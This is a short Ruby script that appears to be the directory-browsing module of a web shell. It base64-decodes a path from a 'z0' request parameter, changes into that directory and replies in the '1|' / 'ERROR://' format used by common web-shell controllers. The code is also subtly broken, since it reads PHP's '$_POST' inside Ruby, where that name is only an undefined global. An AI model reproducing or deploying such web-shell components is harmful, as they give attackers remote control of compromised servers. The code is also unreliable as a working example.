require 'base64'

def main
  sz_dir_path = Base64.decode64($_POST['z0'].to_s)

  begin
    Dir.chdir(sz_dir_path) do
      print "1|#{Dir.pwd}"
    end
  rescue => e
    print 'ERROR://Cannot open directory.'
  end
end

main